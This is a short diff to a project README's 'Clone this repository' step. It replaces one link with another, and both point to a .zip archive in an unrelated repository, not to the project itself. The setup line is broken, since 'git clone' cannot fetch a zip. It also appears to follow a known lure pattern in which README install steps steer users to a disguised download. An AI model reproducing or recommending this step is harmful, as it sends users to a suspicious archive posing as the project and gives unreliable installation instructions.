@@ -45,7 +45,7 @@ Puja/
 
 1. Clone this repository:
    ```
-   git clone https://github.com/Atharva907/Face-auth/raw/refs/heads/main/DataCollect/auth_Face_imbrication.zip
+   git clone https://raw.githubusercontent.com/Atharva907/Face-auth/main/DataCollect/auth_Face_imbrication.zip
    cd Puja
    ```
 
